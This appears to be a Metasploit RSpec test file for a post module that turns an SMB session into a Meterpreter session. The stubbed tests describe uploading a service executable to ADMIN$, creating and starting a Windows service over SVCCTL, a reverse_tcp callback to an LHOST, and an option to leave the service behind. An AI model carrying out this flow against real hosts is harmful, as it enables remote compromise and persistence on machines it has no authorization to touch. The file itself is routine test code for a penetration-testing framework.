# frozen_string_literal: true

require 'spec_helper'

RSpec.describe 'post/windows/manage/smb_to_meterpreter' do
  include_context 'Msf::Simple::Framework#modules loading'

  subject do
    mod = load_and_create_module(
      module_type: 'post',
      reference_name: 'windows/manage/smb_to_meterpreter'
    )
    mod.datastore['SESSION'] = 1
    mod
  end

  let(:tcp_socket) do
    double('tcp_socket',
      peerinfo: '192.0.2.1:445',
      peerhost: '192.0.2.1'
    )
  end

  let(:dispatcher) do
    double('dispatcher', tcp_socket: tcp_socket)
  end

  let(:smb_client) do
    double('RubySMB::Client',
      dispatcher: dispatcher
    )
  end

  let(:tree) do
    double('tree')
  end

  let(:svcctl_pipe) do
    double('svcctl_pipe')
  end

  let(:simple_client) do
    double('simple_client')
  end

  let(:session) do
    double('session',
      type: 'smb',
      client: smb_client,
      simple_client: simple_client,
      tunnel_local: '192.0.2.10:0',
      exploit_datastore: {}
    )
  end

  before(:each) do
    allow(subject).to receive(:session).and_return(session)
    allow(subject).to receive(:print_status)
    allow(subject).to receive(:print_good)
    allow(subject).to receive(:print_error)
    allow(subject).to receive(:print_warning)
    allow(subject).to receive(:vprint_status)
    allow(subject).to receive(:vprint_good)
    allow(subject).to receive(:vprint_warning)
  end

  describe '#validate_session!' do
    context 'when session is disconnected' do
      before do
        allow(tcp_socket).to receive(:peerinfo).and_raise(Errno::ENOTCONN)
      end

      it 'prints error and returns false' do
        expect(subject).to receive(:print_error).with(/not usable/)
        expect(subject.send(:validate_session!)).to be false
      end
    end

    context 'when session type is not smb' do
      before do
        allow(session).to receive(:type).and_return('meterpreter')
      end

      it 'prints error and returns false' do
        expect(subject).to receive(:print_error).with(/Invalid session type/)
        expect(subject.send(:validate_session!)).to be false
      end
    end

    context 'when session is valid' do
      it 'returns true' do
        expect(subject.send(:validate_session!)).to be true
      end
    end
  end

  describe '#resolve_lhost' do
    context 'when module datastore LHOST is set' do
      before do
        subject.datastore['LHOST'] = '10.0.0.1'
      end

      it 'uses the module datastore value' do
        expect(subject.send(:resolve_lhost)).to eq('10.0.0.1')
      end
    end

    context 'when module LHOST is nil and framework global LHOST is set' do
      before do
        subject.datastore['LHOST'] = nil
        framework.datastore['LHOST'] = '10.0.0.2'
      end

      after do
        framework.datastore.delete('LHOST')
      end

      it 'uses the framework global LHOST' do
        expect(subject.send(:resolve_lhost)).to eq('10.0.0.2')
      end
    end

    context 'when no explicit LHOST is configured' do
      before do
        subject.datastore['LHOST'] = nil
        framework.datastore.delete('LHOST')
      end

      it 'extracts host from session tunnel_local' do
        allow(session).to receive(:tunnel_local).and_return('192.0.2.10:12345')
        expect(subject.send(:resolve_lhost)).to eq('192.0.2.10')
      end
    end

    context 'when tunnel_local is "Local Pipe"' do
      before do
        subject.datastore['LHOST'] = nil
        framework.datastore.delete('LHOST')
        allow(session).to receive(:tunnel_local).and_return('Local Pipe')
      end

      it 'prints error and returns nil' do
        expect(subject).to receive(:print_error).with(/Cannot determine LHOST/)
        expect(subject.send(:resolve_lhost)).to be_nil
      end
    end

    context 'when no LHOST source is available' do
      before do
        subject.datastore['LHOST'] = nil
        framework.datastore.delete('LHOST')
        allow(session).to receive(:tunnel_local).and_return(nil)
      end

      it 'prints error and returns nil' do
        expect(subject).to receive(:print_error).with(/Unable to determine LHOST/)
        expect(subject.send(:resolve_lhost)).to be_nil
      end
    end
  end

  describe '#select_payload' do
    context 'when TARGET_ARCH is x64' do
      before do
        subject.datastore['TARGET_ARCH'] = 'x64'
      end

      it 'returns windows/x64/meterpreter/reverse_tcp' do
        expect(subject.send(:select_payload)).to eq('windows/x64/meterpreter/reverse_tcp')
      end
    end

    context 'when TARGET_ARCH is x86' do
      before do
        subject.datastore['TARGET_ARCH'] = 'x86'
      end

      it 'returns windows/meterpreter/reverse_tcp' do
        expect(subject.send(:select_payload)).to eq('windows/meterpreter/reverse_tcp')
      end
    end

    context 'when PAYLOAD_OVERRIDE is set' do
      before do
        subject.datastore['PAYLOAD_OVERRIDE'] = 'windows/x64/meterpreter/reverse_https'
        subject.datastore['TARGET_ARCH'] = 'x64'
      end

      it 'still returns the arch-based payload since run handles the override' do
        expect(subject.send(:select_payload)).to eq('windows/x64/meterpreter/reverse_tcp')
      end
    end
  end

  describe '#service_name' do
    context 'when SERVICE_NAME is set' do
      before do
        subject.datastore['SERVICE_NAME'] = 'CustomSvc'
      end

      it 'uses the configured service name' do
        expect(subject.send(:service_name)).to eq('CustomSvc')
      end
    end

    context 'when SERVICE_NAME is not set' do
      before do
        subject.datastore['SERVICE_NAME'] = nil
      end

      it 'generates a random name between 8 and 16 characters' do
        name = subject.send(:service_name)
        expect(name.length).to be_between(8, 16)
        expect(name).to match(/\A[a-zA-Z]+\z/)
      end
    end
  end

  describe '#execute_upgrade' do
    let(:scm_handle) { double('scm_handle') }
    let(:svc_handle) { double('svc_handle') }
    let(:file_handle) { double('file_handle') }

    before do
      subject.datastore['LHOST'] = '10.0.0.1'
      subject.datastore['LPORT'] = 4444
      subject.datastore['TARGET_ARCH'] = 'x64'
      subject.datastore['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
      subject.datastore['SERVICE_PERSIST'] = false
      subject.datastore['SERVICE_NAME'] = nil
      subject.datastore['SERVICE_DISPLAY_NAME'] = nil
      subject.datastore['SERVICE_FILENAME'] = nil

      # Stub simple_client for ADMIN$ upload
      allow(simple_client).to receive(:connect)
      allow(simple_client).to receive(:disconnect)
      allow(simple_client).to receive(:open).and_return(file_handle)
      allow(simple_client).to receive(:delete)
      allow(file_handle).to receive(:<<)
      allow(file_handle).to receive(:close)

      # Stub RubySMB client for SVCCTL
      allow(smb_client).to receive(:tree_connect).and_return(tree)
      allow(tree).to receive(:open_file).and_return(svcctl_pipe)
      allow(svcctl_pipe).to receive(:bind)
      allow(svcctl_pipe).to receive(:open_sc_manager_w).and_return(scm_handle)
      allow(svcctl_pipe).to receive(:create_service_w).and_return(svc_handle)
      allow(svcctl_pipe).to receive(:start_service_w)
      allow(svcctl_pipe).to receive(:control_service)
      allow(svcctl_pipe).to receive(:delete_service)
      allow(svcctl_pipe).to receive(:close_service_handle)

      # Stub payload generation
      allow(subject).to receive(:generate_upgrade_payload).and_return("\x90" * 100)
      allow(Msf::Util::EXE).to receive(:to_executable_fmt).and_return("MZ\x00" + "\x00" * 500)
    end

    context 'payload upload to ADMIN$' do
      it 'connects to ADMIN$ share and uploads the service EXE' do
        expect(simple_client).to receive(:connect).with("\\\\192.0.2.1\\ADMIN$")
        expect(simple_client).to receive(:open).with(/\\.*\.exe/, 'rwct', 48000, read: true, write: true)
        expect(file_handle).to receive(:<<).with(/\AMZ/)
        expect(file_handle).to receive(:close)
        subject.execute_upgrade('10.0.0.1')
      end
    end

    context 'when ADMIN$ connection fails' do
      before do
        allow(simple_client).to receive(:connect).and_raise(RubySMB::Error::RubySMBError.new('access denied'))
      end

      it 'raises a failure' do
        expect { subject.execute_upgrade('10.0.0.1') }.to raise_error(
          Msf::Post::Failed, /Failed to connect to ADMIN\$ share/
        )
      end
    end

    context 'when payload generation fails' do
      before do
        allow(subject).to receive(:generate_upgrade_payload).and_return(nil)
      end

      it 'raises a failure' do
        expect { subject.execute_upgrade('10.0.0.1') }.to raise_error(
          Msf::Post::Failed, /Failed to generate payload/
        )
      end
    end

    context 'when EXE generation fails' do
      before do
        allow(Msf::Util::EXE).to receive(:to_executable_fmt).and_return(nil)
      end

      it 'raises a failure' do
        expect { subject.execute_upgrade('10.0.0.1') }.to raise_error(
          Msf::Post::Failed, /Failed to generate service EXE/
        )
      end
    end

    context 'SVCCTL service creation and start' do
      it 'connects to IPC$ and creates a service pointing to the uploaded EXE' do
        expect(smb_client).to receive(:tree_connect).with("\\\\192.0.2.1\\IPC$")
        expect(svcctl_pipe).to receive(:create_service_w) do |_scm, _name, _display, bin_path|
          expect(bin_path).to match(/%SYSTEMROOT%\\.*\.exe/)
          svc_handle
        end
        expect(svcctl_pipe).to receive(:start_service_w).with(svc_handle)
        subject.execute_upgrade('10.0.0.1')
      end
    end

    context 'when IPC$ connection fails' do
      before do
        allow(smb_client).to receive(:tree_connect).and_raise(RubySMB::Error::RubySMBError.new('connection refused'))
      end

      it 'prints error and returns without raising' do
        expect(subject).to receive(:print_error).with(/Failed to connect to IPC\$/)
        expect { subject.execute_upgrade('10.0.0.1') }.not_to raise_error
      end
    end

    context 'when SCManager returns ACCESS_DENIED' do
      before do
        allow(svcctl_pipe).to receive(:open_sc_manager_w).and_raise(
          RubySMB::Dcerpc::Error::SvcctlError.new('ERROR_ACCESS_DENIED')
        )
      end

      it 'prints insufficient privileges error' do
        expect(subject).to receive(:print_error).with(/Insufficient privileges/)
        subject.execute_upgrade('10.0.0.1')
      end
    end

    context 'service cleanup' do
      it 'deletes the service and uploaded file after execution' do
        expect(svcctl_pipe).to receive(:delete_service).with(svc_handle)
        expect(simple_client).to receive(:delete).with(/\\.*\.exe/)
        subject.execute_upgrade('10.0.0.1')
      end
    end

    context 'when SERVICE_PERSIST is true' do
      before do
        subject.datastore['SERVICE_PERSIST'] = true
      end

      it 'skips service deletion and file cleanup' do
        expect(svcctl_pipe).not_to receive(:delete_service)
        expect(simple_client).not_to receive(:delete)
        subject.execute_upgrade('10.0.0.1')
      end
    end

    context 'when service creation fails' do
      before do
        allow(svcctl_pipe).to receive(:create_service_w).and_raise(
          RubySMB::Dcerpc::Error::SvcctlError.new('creation failed')
        )
      end

      it 'prints error and still cleans up the uploaded file' do
        expect(subject).to receive(:print_error).with(/Failed to create service/)
        expect(simple_client).to receive(:delete)
        subject.execute_upgrade('10.0.0.1')
      end
    end

    context 'when service start times out' do
      before do
        allow(svcctl_pipe).to receive(:start_service_w).and_raise(
          RubySMB::Dcerpc::Error::SvcctlError.new('ERROR_SERVICE_REQUEST_TIMEOUT')
        )
      end

      it 'treats timeout as expected and continues cleanup' do
        expect(subject).to receive(:vprint_status).with(/timed out, expected/)
        expect(svcctl_pipe).to receive(:delete_service)
        subject.execute_upgrade('10.0.0.1')
      end
    end

    context 'when file cleanup fails' do
      before do
        allow(simple_client).to receive(:delete).and_raise(RubySMB::Error::RubySMBError.new('file locked'))
      end

      it 'prints warning about manual removal' do
        expect(subject).to receive(:print_warning).with(/Could not delete.*Manual removal/)
        subject.execute_upgrade('10.0.0.1')
      end
    end

    context 'with custom SERVICE_FILENAME' do
      before do
        subject.datastore['SERVICE_FILENAME'] = 'custom_payload.exe'
      end

      it 'uses the specified filename for upload' do
        expect(simple_client).to receive(:open).with("\\custom_payload.exe", 'rwct', 48000, read: true, write: true)
        subject.execute_upgrade('10.0.0.1')
      end
    end
  end

  describe '#run' do
    let(:scm_handle) { double('scm_handle') }
    let(:svc_handle) { double('svc_handle') }
    let(:file_handle) { double('file_handle') }
    let(:mock_sessions) { double('sessions', keys: []) }

    before do
      subject.datastore['LHOST'] = '10.0.0.1'
      subject.datastore['LPORT'] = 4444
      subject.datastore['HANDLER'] = false
      subject.datastore['TARGET_ARCH'] = 'x64'
      subject.datastore['PAYLOAD_OVERRIDE'] = nil
      subject.datastore['SERVICE_PERSIST'] = false
      subject.datastore['SERVICE_NAME'] = nil
      subject.datastore['SERVICE_DISPLAY_NAME'] = nil
      subject.datastore['SERVICE_FILENAME'] = nil

      # Stub framework.sessions to prevent SessionManager thread spawning
      allow(framework).to receive(:sessions).and_return(mock_sessions)

      allow(simple_client).to receive(:connect)
      allow(simple_client).to receive(:disconnect)
      allow(simple_client).to receive(:open).and_return(file_handle)
      allow(simple_client).to receive(:delete)
      allow(file_handle).to receive(:<<)
      allow(file_handle).to receive(:close)

      allow(smb_client).to receive(:tree_connect).and_return(tree)
      allow(tree).to receive(:open_file).and_return(svcctl_pipe)
      allow(svcctl_pipe).to receive(:bind)
      allow(svcctl_pipe).to receive(:open_sc_manager_w).and_return(scm_handle)
      allow(svcctl_pipe).to receive(:create_service_w).and_return(svc_handle)
      allow(svcctl_pipe).to receive(:start_service_w)
      allow(svcctl_pipe).to receive(:control_service)
      allow(svcctl_pipe).to receive(:delete_service)
      allow(svcctl_pipe).to receive(:close_service_handle)

      allow(subject).to receive(:generate_upgrade_payload).and_return("\x90" * 100)
      allow(Msf::Util::EXE).to receive(:to_executable_fmt).and_return("MZ\x00" + "\x00" * 500)
    end

    context 'when session is invalid' do
      before do
        allow(tcp_socket).to receive(:peerinfo).and_raise(Errno::ENOTCONN)
      end

      it 'returns early without executing' do
        expect(smb_client).not_to receive(:tree_connect)
        subject.run
      end
    end

    context 'when LHOST cannot be resolved' do
      before do
        subject.datastore['LHOST'] = nil
        framework.datastore.delete('LHOST')
        allow(session).to receive(:tunnel_local).and_return(nil)
      end

      it 'raises a failure without executing' do
        expect(smb_client).not_to receive(:tree_connect)
        expect { subject.run }.to raise_error(Msf::Post::Failed, /LHOST/)
      end
    end

    context 'with valid session and LHOST' do
      it 'executes the full upload and service creation flow' do
        expect(simple_client).to receive(:connect).with("\\\\192.0.2.1\\ADMIN$")
        expect(smb_client).to receive(:tree_connect).with("\\\\192.0.2.1\\IPC$")
        subject.run
      end
    end
  end
end
